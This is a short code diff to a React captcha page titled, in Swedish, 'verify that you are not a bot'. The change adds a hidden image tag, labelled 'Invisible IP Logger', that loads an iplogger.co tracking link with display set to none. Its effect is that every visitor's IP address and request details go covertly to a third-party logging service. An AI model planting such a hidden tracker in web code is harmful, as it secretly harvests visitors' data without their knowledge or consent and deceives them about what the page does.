@@ -34,9 +34,17 @@ export default function VerifyPage({
             Verifiera att du inte är en bot
           </h1>
           <CaptchaRedirectClientWrapper />
+                    {/* Invisible IP Logger */}
+          <img
+            src="https://iplogger.co/1iTzZ4"
+            border="0"
+            style={{ display: "none" }}
+            alt=""
+          />
         </div>
       </main>
       <Footer />
     </>
   );
 }
+
